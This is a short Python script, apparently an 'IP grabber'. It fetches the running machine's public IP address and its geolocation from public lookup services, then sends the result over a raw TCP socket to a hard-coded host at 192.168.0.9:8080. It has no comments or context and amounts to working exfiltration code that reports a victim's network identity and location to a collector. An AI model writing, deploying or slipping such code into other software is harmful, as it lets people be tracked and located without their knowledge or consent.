import requests
import json
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.0.9', 8080))

def ip_grabber():
    ip = requests.get('https://api.ipify.org?format=json').text
    parse = json.loads(ip)
    ip_t = parse['ip']
    geolocation = requests.get(f'http://ip-api.com/json/{ip_t}').text
    return geolocation

s.send(ip_grabber().encode())
s.close()
